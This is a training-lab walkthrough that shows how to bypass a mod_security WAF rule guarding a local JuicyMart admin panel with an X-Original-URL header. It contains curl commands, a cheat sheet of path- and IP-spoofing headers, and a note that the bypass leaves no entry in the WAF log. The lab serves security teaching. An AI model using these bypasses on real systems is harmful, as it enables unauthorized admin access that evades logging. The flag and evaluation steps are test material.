# Activity 2 Walkthrough - WAF Bypass to JuicyMart Admin

The lesson of this activity, in one sentence:

> **WAFs inspect what they see. If you can change what they see, you bypass them.**

You discovered `/admin` was blocked by mod_security in Activity 1. Now you'll find a way through.

---

## Step 1 - Confirm the block

```bash
curl -i http://localhost:30000/admin/dashboard
```

Expected:
```
HTTP/1.1 403 Forbidden
Server: Apache/2.4.66 (Debian)
```

The WAF is doing its job. Now find out *which rule* is blocking it.

---

## Step 2 - Read the WAF audit log to identify the rule

The lab gives you two ways to view the WAF log. Use whichever you prefer.

### Option A - Browser
Open http://localhost:30000/lab/waf-log

You should see your last request in the table:

| Time | Method | Blocked URI | Rule ID | Message |
|------|--------|-------------|---------|---------|
| 25/Apr/2026:... | GET | `/admin/dashboard` | 100001 | Admin path blocked by WAF |

### Option B - Terminal
```bash
tail -n 30 /tmp/modsec_audit.log
```

Look for the line that says:
```
Message: Access denied with code 403 (phase 1).
String match "/admin" at REQUEST_URI.
[id "100001"] [msg "Admin path blocked by WAF"]
```

**What you learned:** Rule `100001` is matching the `REQUEST_URI` variable against the literal string `/admin`. To get past, you need to make `REQUEST_URI` look like something that doesn't match.

---

## Step 3 - Try the obvious bypass first: URL encoding

A naive attacker would try to disguise `/admin` by URL-encoding the letters. The letter `a` is `%61`:

```bash
curl -i http://localhost:30000/%61dmin/dashboard
```

Result:
```
HTTP/1.1 403 Forbidden
```

Still blocked. Refresh `/lab/waf-log` - the same rule fired.

**Why this fails here:** A well-tuned WAF rule applies *transformations* (like URL-decoding) to the input *before* matching. Our rule has `t:urlDecodeUni,t:lowercase` baked in, so it sees `/%61dmin` as `/admin` for matching purposes. Tricks like `/ADMIN`, `/%41DMIN`, `/%2561dmin` all fail for the same reason.

This is an important negative result. Real production WAFs are not defeated by `%XX` games when the rule author bothered to add transformations.

You need a deeper trick.

---

## Step 4 - Think like a pentester: what bypass classes exist?

URL encoding failed because the WAF normalizes the URL before inspecting it. So inspecting the URL is a dead end. **Time to attack a different surface.**

There's a well-known class of WAF bypass that doesn't touch the URL at all - instead, it smuggles the real path in an HTTP **header** that the backend obeys but the WAF doesn't inspect. Pentesters keep these in their head as a "first try" cheat sheet against any Apache or IIS stack with a WAF:

| Header | What it can do (when the backend honors it) | Stack famous for it |
|---|---|---|
| `X-Original-URL` | Override the request path | IIS / ASP.NET, Apache mod_rewrite quirks |
| `X-Rewrite-URL` | Override the request path | Same family as above |
| `X-Forwarded-For` | Spoof source IP for IP-allowlist rules | Reverse-proxy stacks |
| `X-Real-IP` | Same as above | nginx-fronted apps |
| `X-Custom-IP-Authorization` | Spoof auth context | Custom auth middleware |
| `X-Original-Host` | Override Host for routing | Multi-tenant apps |

These all exploit the same idea: **the WAF inspects component A, but a downstream component obeys component B**. If A and B disagree, the WAF guards a door that nobody walks through.

For path-blocked endpoints like ours, the path-rewriting headers are the obvious first try.

---

## Step 5 - Apply the bypass

Try `X-Original-URL`:

```bash
curl -i -H "X-Original-URL: /admin/dashboard" http://localhost:30000/
```

Result:
```
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
Content-Type: text/html; charset=utf-8

... <div class="admin-banner"> ...
... <div class="flag-box">flag=admin_breached_via_url_rewrite</div> ...
```

You're in. Extract the flag in one go:
```bash
curl -s -H "X-Original-URL: /admin/dashboard" http://localhost:30000/ | grep -oE "flag=[a-z_]+"
```

Output:
```
flag=admin_breached_via_url_rewrite
```

### What just happened

You sent `GET / HTTP/1.1` with a header `X-Original-URL: /admin/dashboard`. mod_security looked at the request line, saw `REQUEST_URI = /`, found nothing matching its rules, and let the request through. *After* the WAF's check, Apache's `mod_rewrite` looked at the headers, found `X-Original-URL` non-empty, and internally rewrote the request to `/admin/dashboard` before forwarding to the Flask backend.

The WAF and the routing layer disagreed about what URL you were really requesting. Your header exploited that disagreement.

If `X-Original-URL` hadn't worked, the next thing to try is `X-Rewrite-URL` (same effect, different name some stacks use). Pentesters work down the cheat sheet methodically.

---

## Step 6 - Doing the bypass in the browser

If you prefer the browser to curl:

1. Open Firefox or Chrome DevTools (F12).
2. Go to the **Network** tab.
3. Visit http://localhost:30000/ (you'll see the request appear in the network panel).
4. Right-click the request -> **Edit and Resend** (Firefox) or **Replay XHR** (Chrome).
5. Add a header: `X-Original-URL: /admin/dashboard`.
6. Click Send.
7. The response body is the admin dashboard HTML, including the flag.

Browser extension alternative: install **ModHeader**, configure it to add `X-Original-URL: /admin/dashboard` for `localhost`, then visit `http://localhost:30000/` directly.

---

## Step 7 - Verify the bypass left no trace in the WAF log

Refresh `/lab/waf-log`. Notice that **no new entry appears** for your bypass request - because mod_security never saw `/admin` in the URI. From its point of view, you simply requested `/`. This is exactly why the bypass worked: a defense that inspects only the surface can be evaded by hiding the payload one layer deeper.

This is also why detecting this kind of bypass is hard: the request looks completely normal in WAF logs. You'd only notice it by correlating `X-Original-URL` headers in access logs with the rewritten paths.

---

## Submission

```bash
echo "flag=admin_breached_via_url_rewrite" > /home/labDirectory/flag.txt
bash /home/.evaluationScripts/evaluate.sh
```

Or paste the flag into `flag.txt` via the editor and click **Evaluate**.

---

## What you practiced

| Step | Skill |
|------|-------|
| 1 | Reading WAF block responses |
| 2 | Reading mod_security audit logs to identify the responsible rule |
| 3 | Understanding why naive encoding tricks fail against properly-tuned WAF rules |
| 4 | Reaching for the WAF-bypass header cheat sheet |
| 5 | Applying header-based path injection (`X-Original-URL`) |
| 7 | Verifying the bypass left no trace in the WAF log |

Activity 3 will hand you a *different* web app with **two** restricted endpoints, each protected by a slightly different rule. You'll need to figure out which bypass works on which.
